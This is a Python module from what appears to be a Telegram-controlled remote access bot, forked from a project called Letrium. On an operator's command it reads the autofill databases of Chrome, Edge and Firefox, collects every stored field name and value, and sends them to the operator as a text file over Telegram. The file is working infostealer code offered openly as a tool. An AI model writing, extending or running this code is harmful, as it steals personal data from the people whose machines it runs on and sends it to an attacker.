##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/

# forked from https://github.com/cybermads/Letrium.git
# author: cyberman


from aiogram import  types, F
from aiogram.filters import Command
from config import ALLOWED_USER_ID

import tempfile
import os
import shutil
import sqlite3

LOCAL = os.getenv("LOCALAPPDATA")
APPDATA = os.getenv("APPDATA")

PATHS = {
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
    'Firefox': os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles'),
}

def register_autofill_handler(dp):
    @dp.message(F.text.lower() == "автозаполнения браузера [new]")
    @dp.message(Command("autofill"))
    async def autofill(message: types.Message):
        if message.from_user.id == ALLOWED_USER_ID:
            res = []
            for browser, base in PATHS.items():
                if not os.path.exists(base):
                    continue

                if browser in ['Chrome', 'Edge']:
                    for profile in os.listdir(base):
                        if not (profile == "Default" or profile.startswith("Profile")):
                            continue
                        db = os.path.join(base, profile, "Web Data")
                        if not os.path.exists(db):
                            continue

                        tmp = os.path.join(os.getenv("TEMP"), "webdata_tmp.db")
                        try:
                            shutil.copy2(db, tmp)
                            conn = sqlite3.connect(tmp)
                            cur = conn.cursor()
                            cur.execute("SELECT name, value FROM autofill")
                            for name, value in cur.fetchall():
                                if (name and name.strip()) or (value and value.strip()):
                                    res.append({
                                        "browser": browser,
                                        "name": name,
                                        "value": value
                                    })
                            cur.close()
                            conn.close()
                        except:
                            continue
                        finally:
                            if os.path.exists(tmp):
                                os.remove(tmp)

                elif browser == 'Firefox':
                    for profile in os.listdir(base):
                        profile_path = os.path.join(base, profile)
                        db = os.path.join(profile_path, "formhistory.sqlite")
                        if not os.path.exists(db):
                            continue

                        tmp = os.path.join(os.getenv("TEMP"), "firefox_formhistory_tmp.sqlite")
                        try:
                            shutil.copy2(db, tmp)
                            conn = sqlite3.connect(tmp)
                            cur = conn.cursor()
                            cur.execute("SELECT fieldname, value FROM moz_formhistory")
                            for fieldname, value in cur.fetchall():
                                if (fieldname and fieldname.strip()) or (value and value.strip()):
                                    res.append({
                                        "browser": browser,
                                        "name": fieldname,
                                        "value": value
                                    })
                            cur.close()
                            conn.close()
                        except:
                            continue
                        finally:
                            if os.path.exists(tmp):
                                os.remove(tmp)
            if res:
                text = "\n".join(
                    [f"[{item['browser']}] {item['name']} = {item['value']}" for item in res]
                )

                tmp_file_path = None
                try:
                    with tempfile.NamedTemporaryFile("w+", encoding="utf-8", delete=False, suffix=".txt") as tmp_file:
                        tmp_file.write(text)
                        tmp_file_path = tmp_file.name

                    await message.answer_document(types.FSInputFile(tmp_file_path, filename="browser_data.txt"))
                finally:
                    if tmp_file_path and os.path.exists(tmp_file_path):
                        os.remove(tmp_file_path)
        else:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")